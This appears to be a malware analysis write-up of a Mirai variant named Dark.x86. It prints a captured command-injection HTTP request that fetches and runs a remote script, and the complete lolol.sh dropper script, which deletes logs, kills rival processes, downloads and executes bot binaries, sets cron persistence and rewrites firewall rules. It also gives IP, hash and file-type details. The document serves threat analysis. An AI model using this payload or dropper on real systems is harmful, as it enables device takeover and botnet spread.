# Dark.x86 - [Mirai Variant]


```language
Connection at 9/6/2021 - 5:53:49 :
{"IP": "83.4.247.221", "Req": "GET /backupmgt/localJob.php?session=fail;cd+/tmp;wget+http://212.192.241.72/lolol.sh;curl+-O+http://212.192.241.72/lolol.sh;sh+lolol.sh HTTP/1.1\r\nConnection: close\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Dark\r\n\r\n"}
```
The `lolol.sh` script looks like it requests a download for another piece of malware.First half of script is just killing processes that might conflict, compete or interfere with malware.

```language
rm -rf /tmp
rm -rf /var/log
killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl
killall Nbrute
killall sshd
killall dropbear
killall /var/Sofia
killall /bin/busybox
killall nginx
killall daemon
killall qmap
killall zgrab
killall jq
killall telnetd
killall httpd
killall nginx
killall /bin/sh
killall upnpc-static
killall wsdd
killall proftpd
killall mini_httpd
killall udevd
killall /sbin/udhcpc
killall boa
killall /usr/sbin/inetd
killall dnsmasq

```

second half of the script downloads the correct version of the malware, sets it up as a cron job to run in the background and then closes all the ports that may have been used for the code to initial to get in (i.e port 22 to block SSH from being further exploited, etc).

```
ps axf -o "pid %cpu" | awk '{if($2>=10.0) print $1}' | while read pid; do
cat /proc/$pid/cmdline | grep -a -E "sysrv|network01"
if [ $? -ne 0 ]; then kill -9 $pid; fi
done
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.x86; curl -O http://212.192.241.72/bins/dark.x86;cat dark.x86 >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.mips; curl -O http://212.192.241.72/bins/dark.mips;cat dark.mips >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.mpsl; curl -O http://212.192.241.72/bins/dark.mpsl;cat dark.mpsl >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.arm4; curl -O http://212.192.241.72/bins/dark.arm4;cat dark.arm4 >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.arm5; curl -O http://212.192.241.72/bins/dark.arm5;cat dark.arm5 >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.arm6; curl -O http://212.192.241.72/bins/dark.arm6;cat dark.arm6 >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.arm7; curl -O http://212.192.241.72/bins/dark.arm7;cat dark.arm7 >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.ppc; curl -O http://212.192.241.72/bins/dark.ppc;cat dark.ppc >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.m68k; curl -O http://212.192.241.72/bins/dark.m68k;cat dark.m68k >nginx;chmod +x *;./nginx
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /etc/init.d || cd /; wget http://212.192.241.72/bins/dark.sh4; curl -O http://212.192.241.72/bins/dark.sh4;cat dark.sh4 >nginx;chmod +x *;./nginx
http://212.192.241.72/bins/dark.86_64;cat dark.86_64 >nginx;chmod +x *;./nginx
cd /etc/
sleep 30
cd /var/run/
wget http://212.192.241.72/lolol.sh
chmod 777 lolol.sh
cd /etc/
wget http://212.192.241.72/lolol.sh
chmod 777 lolol.sh
echo > /etc/cron.d/start
echo "*/10 * * * *   root    PATH="$PATH:/var/run/lolol.sh"" > /etc/cron.d/start
echo > /etc/cron.daily/ng
echo "*/10 * * * *   root    PATH="$PATH:/var/run/lolol.sh"" > /etc/cron.daily/ng
echo > /etc/cron.hourly/nng
echo "*/10 * * * *   root    PATH="$PATH:/etc/lolol.sh"" > /etc/cron.hourly/nng
iptables -F
iptables -A INPUT -p tcp --dport 22 -j DROP
iptables -A INPUT -p tcp --dport 23 -j DROP
iptables -A INPUT -p tcp --dport 80 -j DROP
iptables -A INPUT -p tcp --dport 443 -j DROP
iptables -A INPUT -p tcp --dport 8080 -j DROP
iptables -A INPUT -p tcp --dport 9000 -j DROP
iptables -A INPUT -p tcp --dport 8089 -j DROP
iptables -A INPUT -p tcp --dport 7070 -j DROP
iptables -A INPUT -p tcp --dport 8081 -j DROP
iptables -A INPUT -p tcp --dport 9090 -j DROP
iptables -A INPUT -p tcp --dport 161 -j DROP
iptables -A INPUT -p tcp --dport 5555 -j DROP
iptables -A INPUT -p tcp --dport 9600 -j DROP
iptables -A INPUT -p tcp --dport 21412 -j DROP
iptables-save
```

Details about the file `dark.x86` downloaded, and the IP Address hardcoded into the malicious script:
```language

┌──(kali㉿kali)-[~/Malware]
└─$ curl ipinfo.io/212.192.241.72
{
  "ip": "212.192.241.72",
  "city": "Soest",
  "region": "Utrecht",
  "country": "NL",
  "loc": "52.1733,5.2917",
  "org": "AS211252 Delis LLC",
  "postal": "3765",
  "timezone": "Europe/Amsterdam",
  "readme": "https://ipinfo.io/missingauth"
}                                                                               
┌──(kali㉿kali)-[~/Malware]
└─$ sha256sum Dark/dark.x86 
ff6b6396ed822f8c1c86683055afd0a654b31fc5cc5aa46b705997979430713d  Dark/dark.x86
                                                                               
┌──(kali㉿kali)-[~/Malware]
└─$ file Dark/dark.x86      
Dark/dark.x86: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header
```


I've listed this under "Mirai" because I haven't been able to deobfuscate the code yet and tell what anything does, and the hash above is listed as Mirai when ![searched](https://www.joesandbox.com/analysis/478159/0/html). 
